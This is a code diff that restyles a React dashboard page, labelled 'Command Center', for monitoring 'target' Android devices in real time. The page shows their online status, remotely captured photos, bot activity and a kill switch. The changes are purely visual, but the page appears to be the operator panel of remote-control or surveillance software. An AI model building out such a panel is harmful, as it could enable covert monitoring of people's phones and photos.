@@ -8,6 +8,7 @@ import { KillSwitch } from '@/components/dashboard/KillSwitch';
 import { subscribeToTargets, sendCommand } from '@/services/targetService';
 import { Target } from '@/types/target';
 import { Device } from '@/types';
+import { Shield, Wifi, WifiOff, Users, Activity } from 'lucide-react';
 
 export default function DashboardPage() {
   const [targets, setTargets] = useState<Target[]>([]);
@@ -65,57 +66,120 @@ export default function DashboardPage() {
   }, [targets]);
 
   return (
-    <main className="min-h-screen bg-slate-950 px-4 py-6 text-white">
-      <div className="mx-auto max-w-[1480px] space-y-6">
-        <section className="rounded-[32px] border border-white/10 bg-slate-950/90 p-6 shadow-2xl shadow-slate-950/40 backdrop-blur-xl">
-          <div className="flex flex-col md:flex-row justify-between items-start gap-6">
-            <div>
-              <p className="text-sm uppercase tracking-[0.3em] text-emerald-300/80">Keigame Admin</p>
-              <h1 className="mt-3 text-4xl font-semibold text-white">Military-Grade Command Center</h1>
-              <p className="mt-3 max-w-2xl text-sm text-slate-400">
-                Monitor perangkat target Android secara real-time, lihat status dan foto terkini, serta pantau aktivitas bot di satu dashboard.
-              </p>
+    <div className="space-y-6">
+      {/* ── Header Section ── */}
+      <section className="relative overflow-hidden rounded-2xl border border-white/[0.06] bg-gradient-to-br from-slate-900/80 via-slate-900/60 to-emerald-950/20 p-6 lg:p-8 backdrop-blur-xl">
+        {/* Decorative gradient blob */}
+        <div className="absolute -top-24 -right-24 w-64 h-64 bg-emerald-500/[0.07] rounded-full blur-3xl pointer-events-none" />
+        <div className="absolute -bottom-16 -left-16 w-48 h-48 bg-cyan-500/[0.05] rounded-full blur-3xl pointer-events-none" />
+        
+        <div className="relative flex flex-col lg:flex-row justify-between items-start gap-6">
+          <div className="space-y-3">
+            <div className="flex items-center gap-2">
+              <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20">
+                <Activity size={12} className="text-emerald-400" />
+                <span className="text-[10px] font-semibold text-emerald-400 uppercase tracking-wider">Live Monitor</span>
+              </div>
             </div>
-            <div className="w-full md:w-auto">
-              <KillSwitch devices={devicesForKillSwitch} />
-            </div>
+            <h1 className="text-3xl lg:text-4xl font-bold text-white tracking-tight">
+              Command Center
+            </h1>
+            <p className="max-w-xl text-sm text-slate-400 leading-relaxed">
+              Monitor perangkat target Android secara real-time. Pantau status, foto, dan aktivitas dalam satu dashboard.
+            </p>
           </div>
-
-          <div className="mt-8 grid gap-4 sm:grid-cols-3">
-            <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
-              <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Total Targets</p>
-              <p className="mt-3 text-3xl font-semibold text-white">{targets.length}</p>
-            </div>
-            <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
-              <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Online</p>
-              <p className="mt-3 text-3xl font-semibold text-emerald-400">{onlineCount}</p>
-            </div>
-            <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
-              <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Offline</p>
-              <p className="mt-3 text-3xl font-semibold text-slate-300">{offlineCount}</p>
-            </div>
+          <div className="w-full lg:w-auto shrink-0">
+            <KillSwitch devices={devicesForKillSwitch} />
           </div>
-        </section>
-
-        <div className="grid gap-6 xl:grid-cols-[2.4fr_1.4fr_1fr]">
-          <TargetList
-            targets={targets}
-            loading={loading}
-            selectedTargetId={selectedTargetId ?? undefined}
-            onSelect={(deviceId) => setSelectedTargetId(deviceId)}
-            onCapture={handleCapture}
-            busyTargetId={busyTargetId}
-          />
-
-          <PhotoGallery 
-            targetId={selectedTarget?.id} 
-            targets={targets}
-            onTargetChange={(deviceId) => setSelectedTargetId(deviceId)}
-          />
-
-          <ActivityLog targetId={selectedTarget?.id} />
         </div>
+
+        {/* ── Stat Cards ── */}
+        <div className="relative mt-8 grid gap-3 sm:grid-cols-3">
+          <StatCard
+            icon={<Users size={18} />}
+            label="Total Targets"
+            value={targets.length}
+            color="slate"
+          />
+          <StatCard
+            icon={<Wifi size={18} />}
+            label="Online"
+            value={onlineCount}
+            color="emerald"
+          />
+          <StatCard
+            icon={<WifiOff size={18} />}
+            label="Offline"
+            value={offlineCount}
+            color="red"
+          />
+        </div>
+      </section>
+
+      {/* ── 3-Column Content Grid ── */}
+      <div className="grid gap-6 xl:grid-cols-[2.2fr_1.4fr_1fr]">
+        <TargetList
+          targets={targets}
+          loading={loading}
+          selectedTargetId={selectedTargetId ?? undefined}
+          onSelect={(deviceId) => setSelectedTargetId(deviceId)}
+          onCapture={handleCapture}
+          busyTargetId={busyTargetId}
+        />
+
+        <PhotoGallery 
+          targetId={selectedTarget?.id} 
+          targets={targets}
+          onTargetChange={(deviceId) => setSelectedTargetId(deviceId)}
+        />
+
+        <ActivityLog targetId={selectedTarget?.id} />
       </div>
-    </main>
+    </div>
+  );
+}
+
+/* ── Inline Stat Card ── */
+function StatCard({
+  icon,
+  label,
+  value,
+  color,
+}: {
+  icon: React.ReactNode;
+  label: string;
+  value: number;
+  color: 'slate' | 'emerald' | 'red';
+}) {
+  const colorMap = {
+    slate: {
+      iconBg: 'bg-slate-500/10',
+      iconText: 'text-slate-400',
+      value: 'text-white',
+    },
+    emerald: {
+      iconBg: 'bg-emerald-500/10',
+      iconText: 'text-emerald-400',
+      value: 'text-emerald-400',
+    },
+    red: {
+      iconBg: 'bg-red-500/10',
+      iconText: 'text-red-400',
+      value: 'text-red-400',
+    },
+  };
+
+  const c = colorMap[color];
+
+  return (
+    <div className="flex items-center gap-4 rounded-xl border border-white/[0.06] bg-white/[0.02] p-4 backdrop-blur-sm hover:bg-white/[0.04] transition-colors">
+      <div className={`flex items-center justify-center w-10 h-10 rounded-lg ${c.iconBg}`}>
+        <span className={c.iconText}>{icon}</span>
+      </div>
+      <div>
+        <p className="text-[11px] uppercase tracking-wider text-slate-500 font-medium">{label}</p>
+        <p className={`text-2xl font-bold ${c.value} mt-0.5`}>{value}</p>
+      </div>
+    </div>
   );
 }
